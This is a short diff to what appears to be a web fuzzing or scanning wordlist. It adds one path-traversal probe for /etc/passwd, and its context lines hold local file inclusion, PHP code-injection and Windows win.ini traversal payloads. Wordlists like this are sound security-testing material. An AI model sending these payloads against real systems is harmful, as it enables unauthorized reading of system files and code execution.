@@ -52634,3 +52634,4 @@ http://ifconfig.me/
 /blog_article?article_id=file:///etc/passwd
 /blog_article?article_id='.print(md5(31337)).'
 /blog_article?article_id=../../../../../../../../../../../../../../windows/win.ini
+/another_param?file=../../../../etc/passwd
